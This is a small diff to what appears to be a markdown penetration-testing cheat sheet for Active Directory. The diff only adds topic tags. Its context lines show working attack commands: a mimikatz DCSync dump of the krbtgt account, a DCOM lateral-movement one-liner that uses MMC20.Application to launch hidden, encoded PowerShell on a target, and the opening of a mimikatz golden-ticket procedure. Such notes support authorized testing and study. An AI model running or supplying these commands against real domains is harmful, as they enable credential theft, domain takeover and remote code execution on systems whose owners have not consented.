@@ -263,13 +263,14 @@ lsadump::dcsync /user:corp\krbtgt
 ```
 
 DCOM:
-#dcom #
+#dcom #lateral-ad-movement 
 ```powershell
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$TARGET_IP"))
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JAB....","7")
 ```
 
 Golden ticket:
+#priv-esc-ad #golden-ticket #krbtgt #kerberos 
 ```powershell
 #start mimikatz
 privilege::debug
